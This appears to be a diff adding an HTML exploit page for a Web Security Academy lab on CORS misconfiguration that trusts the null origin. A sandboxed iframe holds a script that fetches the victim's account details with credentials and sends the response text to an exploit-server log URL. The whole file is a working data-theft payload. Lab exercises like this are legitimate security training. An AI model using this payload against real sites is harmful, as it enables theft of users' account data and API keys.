@@ -1,0 +1,23 @@
+<html>
+<body>
+</body>
+<div id="log">Iframe is present</div>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
+
+    var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','https://0a36001603054e9880ee94d90099005b.web-security-academy.net/accountDetails',true);
+      req.withCredentials = true;
+  req.setRequestHeader('Origin', 'null');
+  
+      req.send();
+  
+      function reqListener() {
+        console.log(window.location)
+          window.location='https://exploit-0a7b00a703db4e8f808793a201010000.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+      };
+    
+  
+  </script>">
+</iframe>
+</html>
